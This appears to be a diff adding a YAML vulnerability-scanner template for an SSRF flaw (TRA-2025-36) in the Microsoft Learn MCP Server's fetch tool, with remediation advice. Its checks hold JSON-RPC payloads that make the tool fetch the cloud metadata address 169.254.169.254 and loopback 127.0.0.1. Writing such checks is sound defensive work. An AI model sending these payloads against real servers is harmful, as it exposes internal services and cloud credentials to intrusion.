@@ -1,0 +1,77 @@
+id: tra-2025-36-ms-learn-mcp-ssrf
+info:
+  name: "Microsoft Learn MCP Server SSRF (TRA-2025-36)"
+  type: exploit
+  severity: high
+  cvss: 6.9
+  author: aipostex
+  description: |
+    The microsoft_docs_fetch tool in the Microsoft Learn MCP Server lacks URL
+    validation, accepting requests to arbitrary hosts instead of restricting
+    to microsoft.com domains. This enables SSRF attacks through the MCP server
+    to reach internal network services and cloud metadata endpoints.
+  reference:
+    - https://www.tenable.com/security/research/tra-2025-36
+    - https://vulnerablemcp.info/
+  tags: [mcp, ssrf, microsoft, fetch-server]
+  classification:
+    mitre-atlas: [AML.T0049]
+
+detect:
+  - method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: '{"jsonrpc":"2.0","method":"tools/list","id":1}'
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_regex
+        value: "(?i)(microsoft_docs_fetch|docs_fetch|microsoft.*fetch)"
+
+checks:
+  - name: "Microsoft Learn fetch tool accepts arbitrary URLs"
+    method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: |
+      {"jsonrpc":"2.0","method":"tools/call","params":{"name":"microsoft_docs_fetch","arguments":{"url":"http://169.254.169.254/latest/meta-data/"}},"id":2}
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_not_contains
+        value: "error"
+      - type: body_not_contains
+        value: "blocked"
+      - type: body_not_contains
+        value: "denied"
+    severity: high
+    stage: impact
+    landed: reachable
+    finding:
+      title: "TRA-2025-36: Microsoft Learn MCP SSRF - Arbitrary URL Fetch"
+      description: "The microsoft_docs_fetch tool accepted a request to a non-Microsoft (cloud metadata) URL without blocking it — it did not validate that URLs point to microsoft.com domains. This exposes an SSRF surface to internal services; fetched content was not captured by this check."
+      remediation: "Implement strict URL allowlisting to only permit *.microsoft.com and *.azure.com. Block private IP ranges and cloud metadata endpoints. Validate URL schemes (HTTPS only)."
+
+  - name: "SSRF via internal IP fetch"
+    method: POST
+    path: /message
+    headers:
+      Content-Type: application/json
+    body: |
+      {"jsonrpc":"2.0","method":"tools/call","params":{"name":"microsoft_docs_fetch","arguments":{"url":"http://127.0.0.1/"}},"id":3}
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_not_contains
+        value: "error"
+      - type: body_not_contains
+        value: "blocked"
+    severity: high
+    stage: impact
+    landed: reachable
+    finding:
+      title: "TRA-2025-36: Microsoft Learn MCP SSRF - Loopback Access"
+      description: "The microsoft_docs_fetch tool accepted a request to 127.0.0.1 without blocking it, exposing an SSRF surface to internal/loopback services via the MCP server. Fetched content was not captured by this check."
+      remediation: "Block requests to private IP ranges (RFC 1918), loopback, and link-local addresses. Add network-level egress controls."
